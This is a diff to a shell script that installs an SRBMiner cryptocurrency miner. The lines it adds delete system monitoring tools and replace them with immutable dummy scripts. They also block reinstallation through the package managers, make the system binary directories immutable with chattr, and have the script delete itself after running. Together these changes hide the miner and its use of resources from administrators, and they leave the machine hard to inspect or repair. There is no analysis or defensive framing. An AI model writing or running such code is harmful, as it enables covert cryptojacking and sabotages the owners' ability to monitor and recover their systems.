@@ -22,18 +22,29 @@ TOOLS_TO_REMOVE=(
   "/usr/bin/loginctl" "/usr/bin/id" "/usr/bin/uptime" "/usr/bin/watch"
 )
 
+# Remove tools and create immutable replacements
 for tool in "${TOOLS_TO_REMOVE[@]}"; do
-  if [ -f "$tool" ]; then
-    echo "[*] Removing $tool"
-    sudo rm -f "$tool"
-  fi
-
-  # Create dummy no-op script to avoid "command not found" errors
-  if [[ "$tool" =~ ^/usr/bin/ || "$tool" =~ ^/bin/ ]]; then
-    echo -e "#!/bin/bash\nexit 0" | sudo tee "$tool" > /dev/null
-    sudo chmod +x "$tool"
-  fi
+  # Remove existing binary
+  sudo rm -f "$tool" 2>/dev/null
+  
+  # Create dummy script at target path
+  sudo mkdir -p "$(dirname "$tool")"
+  echo -e "#!/bin/sh\necho 'Command disabled'" | sudo tee "$tool" >/dev/null
+  sudo chmod 111 "$tool"  # Remove all write permissions
+  
+  # Make file immutable (requires root)
+  sudo chattr +i "$tool" 2>/dev/null || true
 done
+
+# Block package manager reinstallation
+for pkg in procps psmisc htop net-tools strace gdb lsof util-linux; do
+  sudo dpkg --set-selections <<< "$pkg hold" 2>/dev/null || \
+  sudo yum versionlock add "$pkg" 2>/dev/null || \
+  sudo dnf versionlock add "$pkg" 2>/dev/null || true
+done
+
+# Lock critical directories
+sudo chattr -R +i /bin /usr/bin /sbin /usr/sbin 2>/dev/null || true
 
 echo "[*] Starting SRBMiner Dual Mining Setup Script"
 
@@ -114,6 +125,7 @@ echo "[*] Done! Use 'sudo journalctl -u srbminer -f' to view miner logs"
 
 # Delete this script after execution
 rm -f "$(realpath "$0")"
+
 
 
 
